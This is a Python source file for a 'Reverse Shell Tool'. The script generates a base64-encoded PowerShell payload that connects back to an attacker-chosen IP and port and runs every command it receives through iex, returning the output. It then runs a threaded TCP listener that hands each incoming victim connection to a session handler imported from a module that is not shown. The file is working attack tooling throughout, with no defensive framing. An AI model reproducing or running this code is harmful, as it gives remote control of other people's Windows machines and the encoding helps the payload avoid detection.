import socket
import threading
import base64

from backup import handle_session

# This Function is responsible for generating a powershell-script with base64 encoded.....
def generate_powershell_payload(lhost, lport):
    powershell_command = f"""
    $client = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport});
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535 | %{{0}};
    $sendbuffer = {{param($message) $bytesToSend = ([text.encoding]::ASCII).GetBytes($message); $stream.Write($bytesToSend, 0, $bytesToSend.Length);}};
    try {{
        while (($bytesRead = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
            $data = ([text.encoding]::ASCII).GetString($bytes, 0, $bytesRead).Trim();
            if ($data) {{
                $output = (iex $data 2>&1 | Out-String).Trim();
                $output = $output + "PS> ";
                $sendbuffer.Invoke($output);
            }}
        }}
    }} catch {{
        $sendbuffer.Invoke("Connection lost! Exiting...\n");
    }} finally {{
        $client.Close();
    }}
    """
    encoded_command = base64.b64encode(powershell_command.encode('utf-16le')).decode()
    return f"powershell -e {encoded_command}"

# This function is responsible for listening to all the listeners
def listener(lhost, lport):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((lhost, lport))
    server.listen(5)
    print(f"[+] Listening on {lhost}:{lport}")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")
        threading.Thread(target=handle_session, args=(client,)).start()

# Home page where we enter the Ip address and the port
if __name__ == "__main__":
    print("""
    [+] Reverse Shell Tool
    [+] Generate Payload and Start Listener
    """)
    lhost = input("Enter the listening IP: ").strip()
    lport = int(input("Enter the listening port: ").strip())

    # Shows the generated powershell payload
    payload = generate_powershell_payload(lhost, lport)
    print("\nGenerated PowerShell Command:")
    print(payload)
    print("\nWaiting for incoming connections...\n")

    # Listener
    listener(lhost, lport)
